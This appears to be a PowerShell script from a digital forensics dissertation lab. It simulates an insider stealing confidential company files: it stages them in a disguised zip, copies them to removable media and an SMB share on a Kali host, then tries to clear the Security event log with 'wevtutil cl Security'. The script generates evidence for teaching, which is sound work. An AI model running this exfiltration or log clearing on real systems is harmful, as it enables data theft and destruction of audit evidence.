<#
=====================================================================
 Apex Global Logistics Ltd - Insider Activity Simulation (Script 03)
 Dissertation: Digital Forensics & Cyber Security Virtual Laboratory

 PURPOSE
 Simulates James Carter's (j.carter) normal baseline activity followed
 by the insider-threat kill chain: access, staging, USB transfer,
 network exfiltration, and anti-forensic cleanup.

 RUN ON: APEX-WS01
 RUN AS: apex\j.carter, logged in interactively, in a standard
 (non-elevated) PowerShell session. Do NOT run PowerShell as
 Administrator for this script. J. Carter is intentionally kept as a
 standard domain user with NO local or domain administrator rights.
 This is a deliberate design decision: the scenario represents an
 insider who misuses legitimate access, not an administrator abusing
 unrestricted privileges. See "ANTI-FORENSIC CLEANUP" below for the
 consequence of this decision on the log-clearing step.

 Before running, confirm the session context with:
   whoami
 Expected result: apex\j.carter

 PREREQUISITES
  - Script 01 and Script 02 have completed successfully
  - A second virtual disk is attached and formatted as E:\ (simulated
    removable media)
  - Kali is running a guest-accessible SMB share at \\192.168.100.20\Exfiltration
  - j.carter remains a standard domain user (Operations + Executive
    group membership only, no local/domain admin rights)

 DESIGN NOTE
 This script directly creates the forensic artefacts that these actions
 would produce (LNK files, timestamps, staged/copied files, cleared
 logs) rather than fully automating GUI interaction with Office
 applications, which is fragile to script reliably inside a VM and is
 not required to produce forensically valid artefacts for teaching
 purposes. This is a deliberate, documented simplification - worth a
 sentence in your dissertation's design rationale or limitations.
=====================================================================
#>

# ---------------------------------------------------------------
# 0. CONFIGURATION
# ---------------------------------------------------------------

$OperationsShare   = "\\APEX-DC01\Operations"
$ExecutiveShare    = "\\APEX-DC01\Executive"
$UsbDrive          = "E:\"
$ExfiltrationShare = "\\192.168.100.20\Exfiltration"
$StagingFolder     = Join-Path $env:LOCALAPPDATA "Temp\Backup_Old"
$RecentFolder      = Join-Path $env:APPDATA "Microsoft\Windows\Recent"
$ArchiveName       = "IT_Backup_Aug2026.zip"

# ---------------------------------------------------------------
# PREREQUISITE CHECKS
# Purpose: fail fast, before any incident evidence is created, if the
# lab isn't in the expected state. Prevents a partial/inconsistent
# evidence set from a run that dies halfway through.
# ---------------------------------------------------------------

Write-Host "Checking prerequisites..." -ForegroundColor Cyan

if (-not (Test-Path $UsbDrive)) {
    throw "Prerequisite failed: $UsbDrive is not available. Attach/mount EmployeeUSB before running Script 03."
}

if (-not (Test-Path $ExfiltrationShare)) {
    throw "Prerequisite failed: $ExfiltrationShare is not accessible. Check Kali Samba before running Script 03."
}

if (-not (Test-Connection -ComputerName "192.168.100.20" -Count 2 -Quiet)) {
    throw "Prerequisite failed: Kali (192.168.100.20) is not reachable."
}

Write-Host "All prerequisites passed." -ForegroundColor Green

# ---------------------------------------------------------------
# LOGGING START
# Purpose: j.carter is a standard user, so the log is written under
# his own profile (LOCALAPPDATA) rather than directly under C:\ ,
# which cannot be assumed writable without elevation.
# ---------------------------------------------------------------
$LogDir = Join-Path $env:LOCALAPPDATA "InsiderActivityLogs"
if (-not (Test-Path $LogDir)) { New-Item -Path $LogDir -ItemType Directory -Force | Out-Null }
$LogPath = Join-Path $LogDir ("InsiderActivity_{0}.log" -f (Get-Date -Format "yyyyMMdd_HHmmss"))
Start-Transcript -Path $LogPath

$Start = Get-Date
$ErrorsEncountered = 0

# Baseline files James legitimately and routinely accesses (non-targets)
$BaselineFiles = @(
    @{ Path = Join-Path $OperationsShare "Warehouse Report.docx"; DaysAgo = 6 }
    @{ Path = Join-Path $OperationsShare "Shift Rota.xlsx";       DaysAgo = 5 }
    @{ Path = Join-Path $OperationsShare "Vehicle Checklist.xlsx"; DaysAgo = 4 }
    @{ Path = Join-Path $ExecutiveShare  "Board Minutes - July 2026.docx"; DaysAgo = 3 }
    @{ Path = Join-Path $OperationsShare "Delivery Schedule.xlsx"; DaysAgo = 2 }
)

# The four target files (per the Script 02 Detailed File & Ownership Plan)
$TargetFiles = @(
    Join-Path $OperationsShare "Delivery Schedule.xlsx"
    Join-Path $ExecutiveShare  "Expansion Strategy.docx"
    Join-Path $ExecutiveShare  "Confidential Acquisition Plan.docx"
    Join-Path $ExecutiveShare  "Confidential Budget.xlsx"
)

Write-Host "=== Starting Insider Activity Simulation (j.carter) ===" -ForegroundColor Cyan

# ---------------------------------------------------------------
# HELPER FUNCTIONS
# ---------------------------------------------------------------

function New-RecentLnk {
    param([string]$TargetPath)
    try {
        $fileName = [System.IO.Path]::GetFileNameWithoutExtension($TargetPath)
        $lnkPath = Join-Path $RecentFolder "$fileName.lnk"
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnkPath)
        $shortcut.TargetPath = $TargetPath
        $shortcut.Save()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($shell) | Out-Null
    } catch {
        Write-Warning "  Could not create LNK for $TargetPath : $($_.Exception.Message)"
    }
}

function Add-ConsoleHistoryLine {
    param([string]$Command)
    try {
        $historyPath = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        $historyDir = Split-Path $historyPath -Parent
        if (-not (Test-Path $historyDir)) { New-Item -Path $historyDir -ItemType Directory -Force | Out-Null }
        Add-Content -Path $historyPath -Value $Command
    } catch {
        Write-Warning "  Could not write to PowerShell console history: $($_.Exception.Message)"
    }
}

# ---------------------------------------------------------------
# 1. BASELINE ACTIVITY
# Purpose: establish several days of ordinary, legitimate file access
# so the later deviation is forensically meaningful rather than the
# only activity on the account.
# ---------------------------------------------------------------

Write-Host "`n[1/6] Simulating baseline activity..." -ForegroundColor Yellow

foreach ($Item in $BaselineFiles) {
    try {
        $accessDate = (Get-Date).AddDays(-$Item.DaysAgo)
        if (Test-Path $Item.Path) {
            $file = Get-Item $Item.Path
            $file.LastAccessTime = $accessDate
        }
        New-RecentLnk -TargetPath $Item.Path
        Write-Host "  Baseline access: $($Item.Path) (dated $($accessDate.ToString('yyyy-MM-dd HH:mm')))"
    } catch {
        Write-Warning "  Baseline access failed for $($Item.Path): $($_.Exception.Message)"
        $ErrorsEncountered++
    }
}

# ---------------------------------------------------------------
# 2. ACCESS (incident day - target files)
# Purpose: simulate target-file access and generate associated
# file-system/user artefacts. This is a simplified simulation, not
# proof that a document was opened and read in an Office application -
# do not describe it in the dissertation as guaranteed proof of
# opening/reading. File operations may generate filesystem metadata
# and journal activity; the exact artefacts present will depend on
# Windows version and configuration and should be examined during
# analysis rather than assumed in advance.
# ---------------------------------------------------------------

Write-Host "`n[2/6] Accessing target files..." -ForegroundColor Yellow

foreach ($Target in $TargetFiles) {
    try {
        if (Test-Path $Target) {
            $file = Get-Item $Target

            Write-Host "  Target located: $Target"

            # Read file metadata without deliberately modifying the original file
            $null = $file.Length
            $null = $file.LastWriteTime
        } else {
            Write-Warning "  Target file not found: $Target"
        }

        New-RecentLnk -TargetPath $Target
        Start-Sleep -Seconds 2
    } catch {
        Write-Warning "  Failed to process $Target : $($_.Exception.Message)"
        $ErrorsEncountered++
    }
}

# ---------------------------------------------------------------
# 3. STAGING
# Purpose: copy target files into a disguised local folder and
# compress them. File operations may generate filesystem metadata
# and journal activity; process execution may generate additional
# Windows artefacts (e.g. Prefetch) depending on system configuration.
# These artefacts will be examined during the forensic investigation
# rather than assumed to exist.
# ---------------------------------------------------------------

Write-Host "`n[3/6] Staging files..." -ForegroundColor Yellow

try {
    # Confirm every target exists before staging begins
    $MissingTargets = @(
        $TargetFiles | Where-Object { -not (Test-Path $_) }
    )

    if ($MissingTargets.Count -gt 0) {
        Write-Host "The following target files are missing:" -ForegroundColor Red

        foreach ($Missing in $MissingTargets) {
            Write-Host "  $Missing" -ForegroundColor Red
        }

        throw "Staging stopped because one or more target files are unavailable."
    }

    if (-not (Test-Path $StagingFolder)) {
        New-Item -Path $StagingFolder -ItemType Directory -Force | Out-Null
    }

    foreach ($Target in $TargetFiles) {
        Copy-Item -Path $Target -Destination $StagingFolder -Force -ErrorAction Stop
        Write-Host "  Staged: $(Split-Path $Target -Leaf)"
    }

    $archivePath = Join-Path $StagingFolder $ArchiveName

    $StagedFiles = Get-ChildItem -Path $StagingFolder -File |
        Where-Object { $_.Name -ne $ArchiveName }

    if ($StagedFiles.Count -eq 0) {
        throw "No staged files were found. Archive creation stopped."
    }

    Compress-Archive `
        -Path $StagedFiles.FullName `
        -DestinationPath $archivePath `
        -Force

    Write-Host "  Compressed staged files into: $ArchiveName"
    Write-Host "  NOTE: archive is not password-protected (native Compress-Archive has no encryption support)." -ForegroundColor DarkYellow

} catch {
    Write-Warning "  Staging failed: $($_.Exception.Message)"
    $ErrorsEncountered++
}

# ---------------------------------------------------------------
# 4. USB TRANSFER
# Purpose: copy the archive to the simulated removable volume (E:\)
# ---------------------------------------------------------------

Write-Host "`n[4/6] Transferring to removable media (E:\)..." -ForegroundColor Yellow

try {
    if (-not (Test-Path $UsbDrive)) {
        throw "Drive $UsbDrive not found. Confirm the second virtual disk is attached and formatted."
    }
    $archivePath = Join-Path $StagingFolder $ArchiveName
    Copy-Item -Path $archivePath -Destination $UsbDrive -Force
    New-RecentLnk -TargetPath (Join-Path $UsbDrive $ArchiveName)
    Write-Host "  Copied $ArchiveName to $UsbDrive"
} catch {
    Write-Warning "  USB transfer failed: $($_.Exception.Message)"
    $ErrorsEncountered++
}

# ---------------------------------------------------------------
# 5. NETWORK EXFILTRATION
# Purpose: copy the archive to the Kali SMB Exfiltration share, generating
# genuine network traffic for Wireshark to capture.
# ---------------------------------------------------------------

Write-Host "`n[5/6] Exfiltrating via network (SMB to Kali)..." -ForegroundColor Yellow
Write-Host "  If you want a pcap of this step, start Wireshark capturing on intnet BEFORE running this script." -ForegroundColor DarkYellow

try {
    $archivePath = Join-Path $UsbDrive $ArchiveName
    Copy-Item -Path $archivePath -Destination $ExfiltrationShare -Force
    Write-Host "  Uploaded $ArchiveName to $ExfiltrationShare"
} catch {
    Write-Warning "  Network exfiltration failed: $($_.Exception.Message)"
    Write-Warning "  Check the Kali Samba share is running and reachable: Test-Connection 192.168.100.20"
    $ErrorsEncountered++
}

# ---------------------------------------------------------------
# 6. ANTI-FORENSIC CLEANUP
# Purpose: attempt to remove traces. J. Carter is a standard domain
# user with no local/domain admin rights (deliberate design decision -
# see header). He CAN delete his own staged files without elevation.
# He CANNOT clear the Security event log, which requires
# administrative privilege by design.
#
# The resulting Access Denied is not a script failure - it is itself
# a meaningful, realistic forensic artefact: a failed anti-forensic
# attempt by a non-privileged insider. The attempted command still
# appears in his PowerShell console history, which is exactly what an
# investigator would expect to find and interpret.
# ---------------------------------------------------------------

Write-Host "`n[6/6] Attempting anti-forensic cleanup..." -ForegroundColor Yellow

try {
    Remove-Item -Path $StagingFolder -Recurse -Force -ErrorAction Stop
    Write-Host "  Deleted staging folder"
} catch {
    Write-Warning "  Failed to delete staging folder: $($_.Exception.Message)"
    $ErrorsEncountered++
}

# Simulated anti-forensic attempt
Add-ConsoleHistoryLine -Command "wevtutil cl Security"

wevtutil cl Security 2>&1

if ($LASTEXITCODE -eq 0) {
    Write-Host "  Security event log was cleared." -ForegroundColor Yellow
    Write-Host "  Event ID 1102 may be present as evidence of the log-clearing action." -ForegroundColor DarkYellow
} else {
    Write-Host "  EXPECTED RESULT: Access Denied clearing the Security log." -ForegroundColor Green
    Write-Host "  j.carter has no administrator privileges, so the Security log remains intact." -ForegroundColor Green
    Write-Host "  The attempted command remains in PowerShell history and can be considered during investigation." -ForegroundColor Green
}

# ---------------------------------------------------------------
# SUMMARY
# ---------------------------------------------------------------

$Finish = Get-Date
$Duration = $Finish - $Start

Write-Host "`n=== Insider activity simulation complete ===" -ForegroundColor Cyan
Write-Host "  Insider account:     APEX\j.carter"
Write-Host "  USB destination:     $UsbDrive"
Write-Host "  Network destination: $ExfiltrationShare"
Write-Host "  Errors encountered:  $ErrorsEncountered"
Write-Host "  Execution time:      $($Duration.ToString())"
Write-Host "`nNext steps:" -ForegroundColor Cyan
Write-Host "  1. Do NOT shut down WS01 yet if you want memory acquisition (Magnet RAM Capture) first"
Write-Host "  2. Acquire memory, then disk image (FTK Imager)"
Write-Host "  3. Stop the Wireshark capture on intnet and save the pcap"
Write-Host "  4. Snapshot: 'Post-Insider-Activity' (for your own rollback reference)"
Write-Host "`nFull execution log saved to: $LogPath" -ForegroundColor Cyan

Stop-Transcript
